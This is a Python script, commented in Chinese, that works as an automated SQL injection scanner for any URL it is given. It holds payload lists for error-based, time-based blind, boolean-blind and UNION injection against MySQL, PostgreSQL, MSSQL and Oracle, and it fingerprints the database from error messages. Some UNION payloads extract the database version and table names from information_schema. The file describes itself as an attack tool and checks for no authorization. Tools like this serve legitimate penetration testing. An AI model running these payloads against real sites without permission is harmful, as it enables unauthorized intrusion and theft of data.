# 开发者：自由的风
"""sqli_tester/run.py — SQL注入自动检测(时间盲注/布尔/报错注入)
=============================================================
攻击域 core — 不只测注入点，还从错误回显中提取数据库类型/版本/表结构，
穿透到数据库源码层分析薄弱点。
"""
import sys, json, os, urllib.request, urllib.parse, time, re, concurrent.futures

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# SQL注入payload库 — 每类多种变体
PAYLOADS = {
    "error_based": [
        ("'", "单引号闭合测试"),
        ('"', "双引号闭合测试"),
        ("')", "括号+单引号"),
        ('")', "括号+双引号"),
        ("' OR '1'='1", "OR恒真绕过"),
        ("' OR 1=1--", "OR+注释"),
        ("1' AND 1=1--", "AND恒真"),
        ("1' AND 1=2--", "AND恒假(对比基准)"),
    ],
    "time_blind": [
        ("' OR SLEEP(3)--", "MySQL SLEEP"),
        ("' OR pg_sleep(3)--", "PostgreSQL pg_sleep"),
        ("'; WAITFOR DELAY '0:0:3'--", "MSSQL WAITFOR"),
        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)--", "Oracle DBMS_PIPE"),
    ],
    "boolean_blind": [
        ("' AND '1'='1", "布尔真基准"),
        ("' AND '1'='2", "布尔假对比"),
        ("' OR 'x'='x", "OR布尔"),
    ],
    "union_based": [
        ("' UNION SELECT NULL--", "UNION列数探测 NULL"),
        ("' UNION SELECT NULL,NULL--", "UNION列数探测 NULL,NULL"),
        ("' UNION SELECT NULL,NULL,NULL--", "UNION列数探测 NULL×3"),
        ("' UNION SELECT @@version,NULL--", "UNION提取版本 MySQL"),
        ("' UNION SELECT version(),NULL--", "UNION提取版本 PostgreSQL"),
        ("' UNION SELECT table_name,NULL FROM information_schema.tables--", "UNION提取表名"),
    ],
}

# 数据库指纹特征
DB_FINGERPRINTS = [
    (r"SQL syntax.*MySQL", "MySQL", "mysql"),
    (r"mysql_fetch|mysql_connect", "MySQL", "mysql"),
    (r"PostgreSQL|pg_query|pg_connect", "PostgreSQL", "postgresql"),
    (r"Microsoft SQL|mssql_|sqlsrv_", "MSSQL", "mssql"),
    (r"ORA-\d{5}|Oracle", "Oracle", "oracle"),
    (r"SQLite|sqlite_", "SQLite", "sqlite"),
    (r"you have an error.*sql", "MySQL(通用)", "mysql"),
    (r"Warning.*mysql", "MySQL(Warning)", "mysql"),
    (r"Unclosed quotation mark", "MSSQL", "mssql"),
]


def _send_payload(url, payload, param="q", method="GET", timeout=10):
    """发送SQL注入payload"""
    try:
        if method == "GET":
            encoded = urllib.parse.quote(payload)
            test_url = url.replace(f"{param}=", f"{param}={encoded}", 1)
            if f"{param}=" not in test_url:
                if "?" in test_url:
                    test_url += f"&{param}={encoded}"
                else:
                    test_url += f"?{param}={encoded}"

        start = time.time()
        req = urllib.request.Request(test_url, headers={
            "User-Agent": "GBT-Neighborhood-Pentest/5.0",
            "Accept": "*/*",
        })
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = time.time() - start

        return {
            "url": test_url,
            "status": resp.status,
            "response_len": len(body),
            "elapsed": round(elapsed, 3),
            "body_sample": body[:500],
            "headers": dict(resp.headers),
        }
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return {"url": test_url, "status": e.code, "error_page": True, "body_sample": body[:500]}
    except Exception as e:
        return {"url": test_url, "error": str(e)[:100]}


def do_test(params):
    """SQL注入全面检测"""
    url = params.get("url", params.get("target", ""))
    if not url:
        return {"ok": False, "error": "缺少 url 参数"}

    if not url.startswith("http"):
        url = "http://" + url

    param = params.get("param", "q")
    methods = params.get("methods", ["GET"])

    findings = []
    db_fingerprint = None
    baseline = None

    # ① 基准请求
    baseline = _send_payload(url, "normal_baseline_test", param)
    baseline_time = baseline.get("elapsed", 0.5)
    baseline_len = baseline.get("response_len", 0)
    baseline_body = baseline.get("body_sample", "")

    # ② 遍历所有payload类别
    for category, payloads in PAYLOADS.items():
        for payload, description in payloads:
            result = _send_payload(url, payload, param)

            is_vulnerable = False
            evidence = ""

            if category == "error_based":
                # 检测数据库错误回显
                for pattern, db_name, db_id in DB_FINGERPRINTS:
                    if re.search(pattern, result.get("body_sample", ""), re.IGNORECASE):
                        is_vulnerable = True
                        evidence = f"错误回显泄露: {db_name}"
                        if not db_fingerprint:
                            db_fingerprint = {"type": db_name, "id": db_id}
                        break

            elif category == "time_blind":
                # 时间盲注检测
                if result.get("elapsed", 0) > baseline_time * 2.5:
                    is_vulnerable = True
                    evidence = f"时间延迟: {result['elapsed']}s vs 基准{baseline_time}s"

            elif category == "boolean_blind":
                # 布尔盲注: 比较响应长度差异
                if abs(result.get("response_len", 0) - baseline_len) > baseline_len * 0.1:
                    is_vulnerable = True
                    evidence = f"响应长度差异: {result.get('response_len')} vs 基准{baseline_len}"

            elif category == "union_based":
                # UNION注入: 检测响应中包含数据库版本/表名
                if re.search(r"(\d+\.\d+\.\d+|information_schema)", result.get("body_sample", "")):
                    is_vulnerable = True
                    evidence = "UNION注入成功: 返回数据库信息"

            if is_vulnerable:
                findings.append({
                    "category": category,
                    "payload": payload,
                    "description": description,
                    "evidence": evidence,
                    "severity": "critical",
                })

    return {
        "ok": True,
        "cap": "sqli_tester",
        "action": "test",
        "domain": "攻击域",
        "url": url,
        "payloads_tested": sum(len(p) for p in PAYLOADS.values()),
        "findings": findings,
        "vulnerable_count": len(findings),
        "db_fingerprint": db_fingerprint,
        "verdict": "vulnerable" if findings else "clean",
        "suggestion": "发现注入点应立即修复: 使用参数化查询/预编译语句" if findings else None,
    }


def do_blind(params):
    """时间盲注专项检测"""
    return do_test({**params, "methods": ["GET"]})


def do_error(params):
    """报错注入专项检测"""
    return do_test({**params, "methods": ["GET"]})


HANDLERS = {"test": do_test, "blind": do_blind, "error": do_error}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "test"
    params_str = sys.argv[2] if len(sys.argv) > 2 else "{}"
    try:
        params = json.loads(params_str)
    except Exception:
        params = {}
    handler = HANDLERS.get(action)
    if handler:
        result = handler(params)
        print(json.dumps(result, ensure_ascii=False, default=str))
    else:
        print(json.dumps({"ok": False, "error": f"未知动作: {action}", "available": list(HANDLERS.keys())}, ensure_ascii=False))
